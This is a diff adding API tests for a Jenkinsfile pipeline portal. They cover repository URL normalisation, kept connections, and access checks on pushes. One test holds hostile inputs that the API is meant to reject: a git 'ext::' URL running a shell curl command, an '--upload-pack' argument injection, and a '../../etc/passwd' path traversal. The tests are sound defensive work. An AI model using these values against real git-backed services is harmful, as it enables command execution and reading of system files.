@@ -148,6 +148,62 @@ describe("jenkinsfile pipelines", () => {
     expect(after.body.pipelines).toEqual([]);
   });
 
+  it("stores the connected repository, normalising the SSH URL on the way in", async () => {
+    const app = await appOn(mkdtempSync(join(tmpdir(), "jf-test-")));
+    const created = await request(app)
+      .post("/api/jenkinsfile/pipelines")
+      .set(alex)
+      // What a git host's Clone button gives you. The portal holds a token, not
+      // a key, so it is rewritten here rather than failing three screens later.
+      .send({ ...body, repo: { repoUrl: "git@github.com:org/svc.git", revision: "main", path: "ci/Jenkinsfile" } })
+      .expect(201);
+    expect(created.body.pipeline.repo).toEqual({
+      repoUrl: "https://github.com/org/svc.git",
+      revision: "main",
+      path: "ci/Jenkinsfile",
+    });
+
+    // An update that says nothing about the repo leaves the connection alone —
+    // losing it would silently turn Commit into a dead button.
+    const kept = await request(app).put("/api/jenkinsfile/pipelines/JF-0001").set(alex).send(body).expect(200);
+    expect(kept.body.pipeline.repo.path).toBe("ci/Jenkinsfile");
+  });
+
+  it("refuses to be pointed at anything but an http(s) repository", async () => {
+    const app = await appOn(mkdtempSync(join(tmpdir(), "jf-test-")));
+
+    // `ext::` is git's shell transport — its "URL" is a command git runs.
+    await request(app)
+      .post("/api/jenkinsfile/pull")
+      .set(alex)
+      .send({ repoUrl: "ext::sh -c 'curl evil'", revision: "main", path: "" })
+      .expect(400);
+    await request(app)
+      .post("/api/jenkinsfile/pull")
+      .set(alex)
+      .send({ repoUrl: "https://github.com/o/r.git", revision: "--upload-pack=x", path: "" })
+      .expect(400);
+    await request(app)
+      .post("/api/jenkinsfile/pull")
+      .set(alex)
+      .send({ repoUrl: "https://github.com/o/r.git", revision: "main", path: "../../etc/passwd" })
+      .expect(400);
+  });
+
+  it("will not push a pipeline that is not connected, or someone else's", async () => {
+    const app = await appOn(mkdtempSync(join(tmpdir(), "jf-test-")));
+    await request(app).post("/api/jenkinsfile/pipelines").set(alex).send(body).expect(201);
+
+    // Connected to nothing: the destination is the record's, so there is none.
+    await request(app)
+      .post("/api/jenkinsfile/pipelines/JF-0001/push")
+      .set(alex)
+      .send({ text: "genStage()\n" })
+      .expect(400);
+    await request(app).post("/api/jenkinsfile/pipelines/JF-0001/push").set(sam).send({ text: "x" }).expect(403);
+    await request(app).post("/api/jenkinsfile/pipelines/JF-9999/push").set(alex).send({ text: "x" }).expect(404);
+  });
+
   it("survives a restart and does not reuse the id it already handed out", async () => {
     const dataDir = mkdtempSync(join(tmpdir(), "jf-test-"));
     const first = await appOn(dataDir);
